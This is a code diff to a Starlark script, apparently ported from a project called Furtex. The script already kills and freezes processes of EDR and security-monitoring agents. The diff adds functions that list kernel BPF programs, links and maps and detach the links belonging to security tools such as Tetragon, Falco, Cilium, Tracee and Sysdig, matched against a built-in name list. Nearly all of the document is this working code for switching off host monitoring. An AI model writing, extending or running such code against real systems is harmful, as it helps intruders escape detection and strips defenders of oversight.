@@ -4,11 +4,12 @@
 # Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
 # Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
 #
-# Only the process-level actions are ported: scan, freeze, thaw and kill. The
-# upstream raw bpf(2) link-detach / program-enumeration half is a poor fit for
-# Starlark and belongs to the Go BPF toolkit. freeze/thaw operate on the
-# target's existing cgroup v2, and refuse the agent's own cgroup so a freeze
-# cannot take the agent down with it.
+# Process actions: scan, freeze, thaw, kill. The upstream raw bpf(2)
+# program-enumeration / link-detach half is now available through the bundled
+# libbpf loader (`ebpf_*` builtins): `ebpf` lists kernel BPF programs, links and
+# maps, and `detach` detaches links whose program name matches an EDR pattern.
+# freeze/thaw operate on the target's existing cgroup v2 and refuse the agent's
+# own cgroup so a freeze cannot take the agent down with it.
 
 AT_FDCWD = -100
 O_WRONLY = 1
@@ -19,6 +20,10 @@ EDR_NAMES = [
     "ebpf_exporter", "edr-sensor", "edr_daemon_d", "edr_agentd",
     "edr-agent-t", "edr_endp_t", "wazuhd", "ossec",
 ]
+
+# Substrings matched against BPF program/map names. BPF object names are capped
+# at 15 characters, so keep patterns short.
+EBPF_PATTERNS = ["tetragon", "tg_", "cilium", "falco", "scap", "sysdig", "tracee", "aqua"]
 
 
 def _is_pid(name):
@@ -111,6 +116,80 @@ def _kill(pid):
     return "OK"
 
 
+def _match_bpf(name, pattern):
+    if not name:
+        return False
+    low = str_lower(name)
+    if pattern:
+        return str_contains(low, str_lower(pattern))
+    for pat in EBPF_PATTERNS:
+        if str_contains(low, pat):
+            return True
+    return False
+
+
+def _ebpf_state():
+    progs = ebpf_progs()
+    links = ebpf_links()
+    maps = ebpf_maps()
+    err = progs["error"] or links["error"] or maps["error"]
+    return progs, links, maps, err
+
+
+def _prog_names(progs):
+    names = {}
+    for p in progs["progs"]:
+        names[p["id"]] = p["name"]
+    return names
+
+
+def _ebpf_scan(pattern):
+    print("[*] enumerating kernel BPF objects")
+    progs, links, maps, err = _ebpf_state()
+    if err:
+        print("  [!] libbpf unavailable: %s" % err)
+        return "ERROR: libbpf unavailable"
+    names = _prog_names(progs)
+    found = 0
+    for p in progs["progs"]:
+        if _match_bpf(p["name"], pattern):
+            print(sprintf("  [!] prog id=%-5d type=%-3d name=%s", p["id"], p["type"], p["name"]))
+            found += 1
+    for l in links["links"]:
+        pname = names.get(l["prog_id"], "")
+        if _match_bpf(pname, pattern):
+            print(sprintf("  [!] link id=%-5d prog_id=%-5d prog=%s", l["id"], l["prog_id"], pname))
+            found += 1
+    for m in maps["maps"]:
+        if _match_bpf(m["name"], pattern):
+            print(sprintf("  [!] map  id=%-5d name=%s", m["id"], m["name"]))
+            found += 1
+    print("[*] %d matching BPF object(s)" % found)
+    return "OK"
+
+
+def _detach(pattern):
+    print("[*] detaching matching BPF links")
+    progs, links, maps, err = _ebpf_state()
+    if err:
+        print("  [!] libbpf unavailable: %s" % err)
+        return "ERROR: libbpf unavailable"
+    names = _prog_names(progs)
+    detached = 0
+    for l in links["links"]:
+        pname = names.get(l["prog_id"], "")
+        if not _match_bpf(pname, pattern):
+            continue
+        res = ebpf_detach(l["id"])
+        if res["error"]:
+            print(sprintf("  [!] link %d (%s): %s", l["id"], pname, res["error"]))
+        else:
+            print(sprintf("  [+] detached link %d (%s)", l["id"], pname))
+            detached += 1
+    print("[*] detached %d link(s)" % detached)
+    return "OK"
+
+
 def main(*args):
     action = "scan"
     pid = ""
@@ -124,6 +203,10 @@ def main(*args):
 
     if action == "scan":
         return _scan(pattern)
+    if action == "ebpf":
+        return _ebpf_scan(pattern)
+    if action == "detach":
+        return _detach(pattern)
     if action == "freeze":
         return _freeze(pid, True)
     if action == "thaw":
